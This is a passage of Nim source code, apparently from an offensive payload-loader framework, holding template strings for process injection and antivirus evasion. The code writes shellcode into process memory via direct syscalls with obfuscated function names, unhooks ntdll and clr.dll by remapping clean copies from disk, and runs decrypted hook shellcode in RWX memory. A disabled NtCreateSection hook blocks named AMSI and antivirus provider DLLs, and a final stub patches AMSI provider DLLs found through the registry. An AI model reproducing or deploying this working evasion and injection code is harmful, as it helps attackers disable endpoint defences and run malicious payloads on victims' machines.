                                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                            return nil
                    
                    when defined(SysWhispers):
                        status = oqiazasusjk(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
                    else:
                        status = NtWriteVirtualMemory(ProcessHandle,currentVmBase,unsafeAddr scArray[offsetSc],sizeOfPage,addr szWritten)
                
                    if(status != STATUS_SUCCESS):
                        when defined(verbose):
                            echo obf("[-] NtWriteVirtualMemory failed")
                        return nil
                    else:
                        when defined(verbose):
                            echo obf("[+] NtWriteVirtualMemory succeeded")
                            echo obf("[*] Address: "), repr(currentVmBase)

                Sleep(1)

                offsetSc += DWORD(sizeOfPage)

                when not defined(remoteMapSection):
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):              
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                            return nil
                    when defined(SysWhispers):
                        status = uashdiasdj(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)
                    else:
                        status = NtProtectVirtualMemory(ProcessHandle,addr currentVmBase,addr sizeOfPage,protectionValue #[RX or RWX depending on operators choice]#,addr oldProt)    

                    if(status != STATUS_SUCCESS):
                        when defined(verbose):
                            echo obf("[-] NtProtectVirtualMemory failed")
                        return nil
                    else:
                        when defined(verbose):
                            echo obf("[+] NtProtectVirtualMemory succeeded")
                            echo obf("[*] Address: "), repr(currentVmBase)
        #write(stdout, "This is the prompt -> ")
        #var input = readLine(stdin)
        when defined(remoteMapSection):
            return vcVmResvRemote[0] # The RX permission page, which will be used for actual execution
        else:
            return vmBaseAddress
"""

let UnhookStub * = """



    proc unhook(dllName: string): bool =
        let low: uint16 = 0
        var processH = -1
        when defined(unhookclr):
            if(dllName == obf("clr.dll")):
                clrStart()
                Sleep(2500)

        when defined(DInvoke):
            var ntdllModule = MyGetModuleHandleA(dllName)
        else:
            var ntdllModule = GetModuleHandleA(dllName)
        if ntdllModule == 0:
            when defined(verbose):
                echo obf("Could not get handle for ") & dllName & obf(", loading it..")
            when defined(DInvoke):
                ntdllModule = MyLoadLibraryA(dllName)
            else:
                ntdllModule = LoadLibraryA(dllName)
            
        var 
            mi : MODULEINFO
            ntdllBase : LPVOID
            ntdllFile : FileHandle
            ntdllMapping : HANDLE
            ntdllMappingAddress : LPVOID
            hookedDosHeader : PIMAGE_DOS_HEADER
            hookedNtHeader : PIMAGE_NT_HEADERS
            hookedSectionHeader : PIMAGE_SECTION_HEADER

        when defined(DInvoke):
            discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
        else:
            discard GetModuleInformation(processH, ntdllModule, cast[LPMODULEINFO](addr mi), cast[DWORD](sizeof(mi)))
        ntdllBase = mi.lpBaseOfDll

        var dllCstring: cstring = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        var dllPath: string
        discard GetModuleFileNameA(ntdllModule, cast[LPSTR](dllCstring), DWORD(len(dllCstring)))
        when defined(verbose):
            dllPath = $dllCstring
            echo obf("[*] Target DLL path: "), dllPath
            
        ntdllFile = getOsFileHandle(open(dllPath,fmRead))
        when defined(DInvoke):
            ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
        else:
            ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
        if ntdllMapping == 0:
            when defined(verbose):
                echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
            return false
        when defined(DInvoke):
            ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
        else:
            ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
        if ntdllMappingAddress.isNil:
            when defined(verbose):
                echo obf("Could not map view of file ") & fmt"({GetLastError()})."
            return false
        hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
        hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
        var status = 0
        for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
            hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
            if ".text" in toString(hookedSectionHeader.Name):
                var oldProtection: DWORD = 0
                var oldProtection2: DWORD = 0
                var bytesWritten: SIZE_T
                var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
                var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
                when defined(unhookclr):
                    if(dllName == obf("clr.dll")):
                        # we dont want to touch the first 16kB, so we modify from ds + 0x4000
                        ds = ds + 0x4000
                        pSize = pSize - 0x4000
                        ntdllMappingAddress = ntdllMappingAddress + 0x4000
                when defined(SysWhispers):
                    status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
                        return false
                    status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
                        return false
                    status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{status}."
                        return false
                else:
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):              
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                            return false
                        # We need to use RWX here, as with RW the Syscall it'self (retrieved via HellsGate from memory ntdll) cannot execute anymore and the process crashes.
                        status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x40, addr oldProtection)    
                    when defined(GetSyscallStub):
                        status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x04, addr oldProtection)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{status}."
                        return false
                    when defined(Hellsgate):
                        if getSyscall(ntWriteTable):
                            syscall = ntWriteTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                            return false
                    status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{status}."
                        return false
                    when defined(Hellsgate):
                        if getSyscall(ntProtectTable):
                            syscall = ntProtectTable.wSysCall
                        else:
                            when defined(verbose):
                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                            return false
                    status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
                    if status != 0:
                        when defined(verbose):
                            echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{status}."
                        return false  
        status = NtClose(processH)
        status = NtClose(ntdllFile)
        status = NtClose(ntdllMapping)
        when defined(DInvoke):
            discard MyFreeLibrary(ntdllModule)
        else:
            discard FreeLibrary(ntdllModule)
        return true

    # for each string in the sequence dllNames, call unhook
    for dllName in dllNames:
        var result = unhook(dllName)
        when defined(verbose):
            echo obf("[*] unhook ") & dllName  & fmt" : {bool(result)}"


"""

let AMSINtCreateSectionHookStubFirst * = """


##########################################################################################################

# Current Workaround for the NtCreateSection Hook as the imlementation below is not working yet.



const hookShellcode = slurp"enchook.blob"
var hookShellcodeBytes: seq[byte] = toByteSeq(hookShellcode)

var dectext2 = newSeq[byte](len(hookShellcodeBytes))
var ptrKey2 = cast[ptr byte](addr key2[0])
var ptrEncText2: ptr byte # = cast[ptr byte](addr hookShellcodeBytes[0])
var ptrDecText2: ptr byte # = cast[ptr byte](addr decText2[0])
let dataLen2 = uint(len(hookShellcodeBytes))


proc decryptLate2(): void =

    when defined(verbose):
        echo obf("[!] Decrypting Hook-Shellcode for execution in memory")
    dctx2.init(ptrKey2)
    discard calcHard()
    dctx2.decrypt(ptrEncText2, ptrDecText2, dataLen2)
    dctx2.clear()

proc NtCreateSectionHookShellcode[byte](friendlycode: openarray[byte]): void =

    var pHandle: HANDLE = -1 # Current Process Handle
        
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
        dataSz          : SIZE_T            = cast[SIZE_T](friendlycode.len)
    
    when defined(GetSyscallStub):
        var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
        let syscallStub_NtAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)
        
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + cast[HANDLE](SYSCALL_STUB_SIZE)
        var oldProtection: DWORD = 0
        var success: BOOL

        # define NtAllocateVirtualMemory
        let NtAllocateVirtualMemory = cast[myNtAllocateVirtM](cast[LPVOID](syscallStub_NtAlloc))
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtualMemory](cast[LPVOID](syscallStub_NtWrite))
        success = GetSyscallStub(obf("NtAllocateVirtualMemory"), cast[LPVOID](syscallStub_NtAlloc))
        success = GetSyscallStub(obf("NtWriteVirtualMemory"), cast[LPVOID](syscallStub_NtWrite))
        var syscallStub_NtCreate: HANDLE = cast[HANDLE](syscallStub_NtWrite) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # define NtCreateThreadEx
        let NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreate))
        success = GetSyscallStub(obf("NtCreateThreadEx"), cast[LPVOID](syscallStub_NtCreate))

        var syscallStub_NtClose: HANDLE = cast[HANDLE](syscallStub_NtAlloc) + (4 * cast[HANDLE](SYSCALL_STUB_SIZE))
        # define NtClose
        NtClose = cast[myNtClose](cast[LPVOID](syscallStub_NtClose))
        success = GetSyscallStub(obf("NtClose"), cast[LPVOID](syscallStub_NtClose))
        
    

    when defined(Hellsgate):
        if getSyscall(ntAllocTable):
            syscall = ntAllocTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Hook - Failed to find opcode for NtAllocateVirtualMemory")
        
    when defined(SysWhispers):
        status = oqiahsjynmxkla(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    else:
        status = NtAllocateVirtualMemory(pHandle, &buffer, 0, &dataSz, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

        
    if not NT_SUCCESS(status):
        when defined(verbose):
            echo obf("[-] Hook - Failed to allocate memory.")
    else:
        when defined(verbose):
            echo obf("[+] Hook - Allocated a page of memory with RWX perms")
        
    var bytesWritten: SIZE_T
    when defined(Hellsgate):
        var 
            ntWritefuncHash        : uint64            = djb2_hash(obf("NtWriteVirtualMemory"))
            ntWriteTable         : HG_TABLE_ENTRY    = HG_TABLE_ENTRY(dwHash : ntWritefuncHash)

        if getSyscall(ntWriteTable):

            syscall = ntWriteTable.wSysCall
        else:
            when defined(verbose):
                echo obf("[-] Hook - Failed to find opcode for NtWriteVirtualMemory")
        
    when defined(SysWhispers):
        status = oqiazasusjk(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)
    else:       
        status = NtWriteVirtualMemory(pHandle,buffer,unsafeAddr friendlycode,dataSz-1,addr bytesWritten)

    if not NT_SUCCESS(status):
        when defined(verbose):
            echo obf("[-] Hook - Failed to write memory.")
    else:
        when defined(verbose):
            echo obf("[+] Hook - NtWriteVirtualMemory - Success ")
                
    
    var tHandle: HANDLE
    when defined(SysWhispers):
        ptrEncText2 = cast[ptr byte](buffer)
        ptrDecText2 = cast[ptr byte](buffer)
        decryptLate2()
        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
        NtWaitForSingleObject(tHandle, 0, nil)
        status = zuatzuastdiasyy(tHandle)
        status = zuatzuastdiasyy(pHandle)
        when defined(verbose):
            echo obf("[*] Hook -  NtCreateThreadEx: "), toHex(status)
    else:    
        when defined(Hellsgate):
            if getSyscall(ntCreateTable):
                syscall = ntCreateTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Hook -  Failed to find opcode for NtCreateThreadEx")
        ptrEncText2 = cast[ptr byte](buffer)
        ptrDecText2 = cast[ptr byte](buffer)
        decryptLate2()
        status = NtCreateThreadEx(
        &tHandle, 
        THREAD_ALL_ACCESS, 
        nil, 
        -1,
        buffer, 
        nil, FALSE, 0, 0, 0, nil)
        when defined(verbose):
            echo obf("[*] Hook - NtCreateThreadEx: "), toHex(status)
    when defined(Hellsgate):
        when defined(Hellsgate):
            if getSyscall(ntCloseTable):
                syscall = ntCloseTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Hook - Failed to find opcode for NtClose")
    status = NtClose(tHandle)
    status = NtClose(pHandle)
    return

NtCreateSectionHookShellcode(hookShellcodeBytes)

##########################################################################################################

"""

let AMSINtCreateSectionHookStubUnused * = """

#[
proc MyNtCreateSection2(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS
type
    typeNtCreateSection = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                    MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                    FileHandle: HANDLE): NTSTATUS {.stdcall.}
type
    HookedNtCreate {.bycopy.} = object
        origNtCreate: typeNtCreateSection
        ntCreateStub: array[16, BYTE]
var g_hookedNtCreate: HookedNtCreate

var ntCreate_Address: HANDLE
var NtCreateSection: typeNtCreateSection

proc redirFunction(redirect: BOOL, SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS =
    
    #type
    #    typeNtCreateSection = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
    #                    MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
    #                    FileHandle: HANDLE): NTSTATUS {.stdcall.}
    type
        MyNtFlushInstructionCache = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}
    type
        HookTrampolineBuffers {.bycopy.} = object
            originalBytes: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
            originalBytesSize: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
            previousBytes: HANDLE
            previousBytesSize: DWORD
    
    # To load ntdll.dll, we are going to use LdrLoadDll instead of LoadLibraryA
    # because LoadLibraryA is hooked by some AVs.

    var ModuleFileName: UNICODE_STRING
    when defined(DInvoke):
        MyRtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
    else:
        RtlInitUnicodeString(ModuleFileName, obf("ntdll.dll"))
    var ntdlldll: HANDLE
    when defined(DInvoke):
        var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, ntdlldll)
    else:
        var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &ntdlldll)

    if not NT_SUCCESS(dllstatus):
        when defined(verbose):
            echo obf("[X] Failed to load ntdll.dll")
    else:
        when defined(verbose):
            echo obf("[+] Loaded ntdll.dll")
    
    when defined(DInvoke):
        var NtFlushInstructionCacheAddress = MyGetProcAddress(ntdlldll, obf("NtFlushInstructionCache"))
    else:
        var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
    if isNil(NtFlushInstructionCacheAddress):
        when defined(verbose):
            echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")
    var NtFlushInstructionCache: MyNtFlushInstructionCache
    NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)
    proc hookntCreateSection(): bool
    proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                        buffers: ptr HookTrampolineBuffers = nil): bool
    #var g_hookedNtCreate: HookedNtCreate

    proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS
    if(redirect):
        var stats = MyNtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
        return stats
    
    proc restore_hook_ntcreatesection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): BOOL =
        var buffers: HookTrampolineBuffers
        buffers.originalBytes = cast[HANDLE](addr g_hookedNtCreate.ntCreateStub[0])
        buffers.originalBytesSize = DWORD(sizeof(g_hookedNtCreate.ntCreateStub))
        when defined(DInvoke):
            var addressToHook: LPVOID = cast[LPVOID](MyGetProcAddress(MyGetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
        else:
            var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
        var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](ntCreate_Address), nil, &buffers)
        if (trampolinesuccess == false):
            when defined(verbose):
                echo obf("Failed to install trampoline")
            quit(1)
        else:
            when defined(verbose):
                echo obf("Restored old function values!")
        when defined(verbose):
            echo obf("Calling real NtCreateSection\r\n")
        var status = NtFlushInstructionCache(-1, addressToHook, 16)
        if (status == 0):
            when defined(verbose):
                echo obf("NtFlushInstructionCache success")
        NtCreateSection = cast[typeNtCreateSection](addressToHook)
        status = NtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
        
        if (status == 0):
            when defined(verbose):
                echo obf("NtCreateSection success")
        else:
            quit(1)
        when defined(verbose):
            echo obf("RE-Hooking")
        var lpFileName: array[4096, WCHAR]
        var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle    
        var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
        var hooksuccess: bool = false
        # version.dll is the last DLL being loaded when Invoking an C# Assembly from Nim, for some reason the hook however prevents the assembly from being loaded correctly so we restore it here
        if("version.dll" in dllName):
            when defined(verbose):
                echo obf("[X] Version loaded")
                echo obf("No more re-hook")
        else:
            hooksuccess = hookntCreateSection()
            when defined(verbose):
                echo obf("Hook:"), hooksuccess
        return hooksuccess
    proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS  =
        if(FileHandle != 0):
            var lpFileName: array[4096, WCHAR]
            var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle
            if (res == 0):
                when defined(verbose):
                    echo obf("[X] Failed to get the file path of the file handle")
            else:
                when defined(verbose):
                    echo obf("GetFinalPathNameByHandleA success")
                
                var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
                when defined(verbose):
                    echo obf("Following DLL wants to be loaded: "), $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
                # Only for Debugging purposes
                #var input = readLine(stdin)
                if((obf("amsi.dll") in dllName) or (obf("MpOAV.dll") in dllName) or (obf("MpClient.dll") in dllName) or (obf("MsMpLics.dll") in dllName) or (obf("fsamsi64.dll") in dllName) #[F-Secure AMSI]# or (obf("spapi64.dll") in dllName) or (obf("symamsi.dll") in dllName) #[Norton AMSI Provider]# or (obf("TmAMSIProvider64.dll") in dllName) #[Trend Micro AMSI Provider]# or (obf("TmUmEvt64.dll") in dllName) or (obf("bdhkm64.dll") in dllName) #[BitDefender Hooking DLl]# or (obf("awshook.dll") in dllName) #[AVAST Hook]# or (obf("amsi64.dll") in dllName) or (obf("antimalware_provider.dll") in dllName) #[Kaspersky AntiMalware Provider]# #[or ("wldp.dll" in dllName)]#):
                    when defined(verbose):
                        echo obf("[X] Target DLL is being loaded")
                        echo obf("Stopping it by loading with READ_ONLY so that no more execution is possible")
                    return 0xC0000054 # Return 0 to prevent AMSI from being loaded - Not working in Nim actually as winim assembly::load is throwing an error
                    # So instead we load the DLL but READ_ONLY, so that no execution is possible afterwards 
                    #if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PAGE_READONLY, SectionAttributes, FileHandle)):
                    #    when defined(verbose):
                    #        echo obf("Restore success")
                    #else:
                    #    return -1
                else:
                    if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
                        when defined(verbose):
                            echo obf("Restore success")
                    else:
                        return -1
    proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                        buffers: ptr HookTrampolineBuffers): bool =
        var trampoline: seq[byte]
        if defined(amd64):
            trampoline = @[
                byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
                byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
            ]
            var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
            moveMemory(&trampoline[2] , &tempjumpaddr, 6)
        elif defined(i386):
            trampoline = @[
                byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
                byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
            ]
            var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
            moveMemory(&trampoline[1] , &tempjumpaddr, 3)
        
        var dwSize: DWORD = DWORD(len(trampoline))
        var dwOldProtect: DWORD = 0
        var output: bool = false
        
        if (installHook):
            output = true
            if (buffers != nil):
                if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
                    when defined(verbose):
                        echo obf("Previous Bytes == 0")
                    return false
                moveMemory(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)
            if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
                when defined(verbose):
                    echo obf("Virtual Protect to RWX success!")
                moveMemory(addressToHook, addr trampoline[0], dwSize)
                output = true
        
        if (not installHook):
            when defined(verbose):
                echo obf("Restoring old NtCreateSection!")
                echo obf("Original Bytes restore address: "), toHex(buffers.originalBytes)
                echo obf("Original Bytes Size: "), buffers.originalBytesSize
            if (buffers != nil):
                if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
                    when defined(verbose):
                        echo obf("Original Bytes == 0")
                    return false
                dwSize = buffers.originalBytesSize
                if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
                    moveMemory(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
                    when defined(verbose):
                        echo obf("Original Bytes restored!")
                    output = true
            else:
                echo obf("Buffers == nil")
        
        var status = NtFlushInstructionCache(-1, addressToHook, dwSize)
        if (status == 0):
            when defined(verbose):
                echo obf("NtFlushInstructionCache success")
        else:
            when defined(verbose):
                echo obf("NtFlushInstructionCache failed: "), toHex(status)
        
        VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)
        return output
    proc hookntCreateSection(): bool =
        when defined(DInvoke):
            var addressToHook: LPVOID = cast[LPVOID](MyGetProcAddress(MyGetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
        else:
            var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA(obf("ntdll.dll")), obf("NtCreateSection")))
        ntCreate_Address = cast[HANDLE](addressToHook)
        when defined(verbose):
            echo obf("NtCreateSection Address: "), repr(addressToHook)
        var buffers: HookTrampolineBuffers
        var output: bool = false
        
        if (addressToHook == nil):
            return false
            
        buffers.previousBytes = cast[HANDLE](addressToHook)
        buffers.previousBytesSize = DWORD(sizeof(addressToHook))
        g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
        var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
        moveMemory(PointerToOrigBytes, addressToHook, 16)
        
        output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MyNtCreateSection2), &buffers)
        return output
    if (not redirect):
        var hooksuccess = hookntCreateSection()
        when defined(verbose):
            echo obf("Hook:"), hooksuccess

proc MyNtCreateSection2(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS =
    redirFunction(TRUE, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)

]#
"""

let AMSINtCreateSectionHookStub * = """

    #discard redirFunction(FALSE,nil,0,nil,nil,0,0,0)


"""


let AMSIProviderPatchStub * = """


    var
        CLSID: string
        ProviderDLLs: seq[string]
        ProviderHandle: RegHandle
        InProcServer32Handle: RegHandle
    # http://miere.ru/docs/registry/
    proc getProviderDLLs(): seq[string] =
        try:
            ProviderHandle = open("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\AMSI\\Providers\\", samRead)
        except OSError:
            echo "err: ", getCurrentExceptionMsg()
        finally:
            for CLSID in enumSubkeys(ProviderHandle):
                #echo CLSID
                var ProviderKey: string = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\"
                ProviderKey.add(CLSID)
                ProviderKey.add("\\InprocServer32\\") 
                try:
                    InProcServer32Handle = open(ProviderKey, samRead)
                except OSError:
                    echo "err: ", getCurrentExceptionMsg()
                ProviderDLLs.add(readString(InProcServer32Handle, ""))

            return ProviderDLLs

    proc ProviderPatchAmsi(): void =
        var
            amsi: HMODULE
            cs: pointer
            op: ULONG
            t: ULONG
            disabled: bool = false
        
        when defined amd64:
            const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
        elif defined i386:
            const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
        
        var ProviderDLLs: seq[string] = getProviderDLLs()
        
        for DLL in ProviderDLLs:
            var DLLtoLoad = DLL
            DLLtoLoad.removePrefix('"')
            DLLtoLoad.removeSuffix('"')
        

            var ModuleFileName: UNICODE_STRING
            when defined(DInvoke):
                MyRtlInitUnicodeString(ModuleFileName, DLLtoLoad)
            else:
                RtlInitUnicodeString(ModuleFileName, DLLtoLoad)
            when defined(DInvoke):
                var dllstatus = MyLdrLoadDll(nil, 0, &ModuleFileName, &amsi)
            else:
                var dllstatus = LdrLoadDll(nil, 0, &ModuleFileName, &amsi)

            if not NT_SUCCESS(dllstatus):
                when defined(verbose):
                    echo obf("[X] Failed to load: "), DLLtoLoad
                    return
            else:
                when defined(verbose):
                    echo obf("[+] Loaded: "), DLLtoLoad

            when defined(DInvoke):
                cs = MyGetProcAddress(amsi,obf("DllGetClassObject"))
            else:
                cs = GetProcAddress(amsi,obf("DllGetClassObject"))
            if isNil(cs):
                when defined(verbose):
                    echo obf("[X] Failed to get the address of 'DllGetClassObject'")
                return
            
            var oldProtection: DWORD = 0
            var success: BOOL
            var protectAddress = cs
            var friendlycodeLength = cast[SIZE_T](patch.len)
            var pHandle: HANDLE = -1
            var 
                status          : NTSTATUS          = 0x00000000
                buffer          : LPVOID
            
            when defined(SysWhispers):
                status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                        
                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] Failed to change memory protections.")
                else:
                    when defined(verbose):
                        echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")
                var 
                    bytesWritten: SIZE_T
                var outLength: SIZE_T
                status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] Failed to write memory.")
                else:
                    when defined(verbose):
                        echo obf("[+] oqiazasusjk Succeed!")
                        
                    
                status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                        
                if not NT_SUCCESS(status):
                    when defined(verbose):
                        echo obf("[-] Failed to allocate memory.")
                else:
                    when defined(verbose):
